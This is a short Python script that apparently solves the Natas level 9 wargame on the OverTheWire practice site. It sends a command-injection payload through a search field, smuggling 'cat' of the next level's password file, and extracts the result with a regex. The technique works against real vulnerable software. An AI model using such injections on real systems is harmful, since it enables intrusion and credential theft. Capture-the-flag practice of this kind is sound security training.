#! /usr/bin/python

import requests
import re

username = 'natas9'
password = ''

payload = '?needle=;cat /etc/natas_webpass/natas10;&submit=Search'
r = requests.get('http://natas9.natas.labs.overthewire.org/index.php' + payload, auth=(username, password))
pattern = r'<pre>\s(\w+)\s</pre>'
result = re.search(pattern, str(r.content))

print result.group(1)
